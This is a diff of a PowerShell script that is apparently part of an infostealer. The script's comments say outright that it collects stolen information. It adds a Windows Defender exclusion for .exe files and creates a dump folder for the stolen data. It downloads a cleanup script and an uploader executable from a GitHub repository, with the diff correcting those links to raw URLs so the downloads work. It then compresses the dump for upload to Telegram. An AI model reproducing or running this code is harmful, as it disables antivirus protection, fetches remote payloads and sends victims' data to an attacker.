@@ -4,9 +4,9 @@ Add-MpPreference -ExclusionExtension exe -Force
 #Add exception for .exe files in antivirus
 mkdir dump 
 #Create dump/ directory to put all informations that we'll steal in it
-Invoke-WebRequest https://github.com/PFranck06/HowardTelegram/blob/main/fin_upload.ps1 -OutFile fin_upload.ps1 
+Invoke-WebRequest https://raw.githubusercontent.com/PFranck06/HowardTelegram/main/fin_upload.ps1 -OutFile fin_upload.ps1 
 #Download final .ps1 file to delete all .txt files and stop all powershell process
-Invoke-WebRequest https://github.com/PFranck06/HowardTelegram/blob/main/telegram_uploader.exe -OutFile telegram_uploader.exe 
+Invoke-WebRequest https://raw.githubusercontent.com/PFranck06/HowardTelegram/main/telegram_uploader.exe -OutFile telegram_uploader.exe 
 #Download uploader file to upload all informations on telegram
 Compress-Archive dump/ dump.zip 
 #Compress dump/ folder to upload it on telegram
